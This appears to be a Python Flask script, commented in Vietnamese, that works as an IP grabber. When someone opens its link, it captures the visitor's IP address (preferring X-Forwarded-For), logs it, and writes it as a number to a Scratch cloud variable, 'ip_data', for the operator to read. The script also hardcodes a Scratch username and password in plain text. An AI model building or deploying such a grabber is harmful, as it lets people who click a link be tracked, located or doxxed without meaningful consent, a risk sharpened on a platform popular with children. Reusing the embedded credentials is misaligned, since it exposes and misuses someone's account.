from flask import Flask, request
import scratchattach as scratch

# 1. Đăng nhập vào Scratch (Điền tài khoản của bạn)
session = scratch.login("Daneolion", "hoangbaoanh")
conn = session.connect_cloud("1326499505")

app = Flask(__name__)

@app.route('/')
def send_ip_only():
    # Lấy IP của người bấm vào link
    user_ip = request.remote_addr
    if request.headers.getlist("X-Forwarded-For"):
        user_ip = request.headers.getlist("X-Forwarded-For")[0]

    print(f"\n[HỆ THỐNG] Đã bắt được IP: {user_ip}")

    # Xóa bỏ các dấu chấm trong IP để biến nó thành một dãy số thuần túy
    ip_numbers = user_ip.replace(".", "")

    # Bắn dãy số IP này lên biến đám mây ip_data
    try:
        conn.set_var("ip_data", int(ip_numbers))
        print(f"[SCRATCH] Đã gửi dãy số IP thành công: {ip_numbers}")
    except Exception as e:
        print(f"Lỗi gửi lên Scratch: {e}")

    return f"<h3>Kết nối thành công!</h3><p>Hệ thống đã ghi nhận IP của bạn.</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
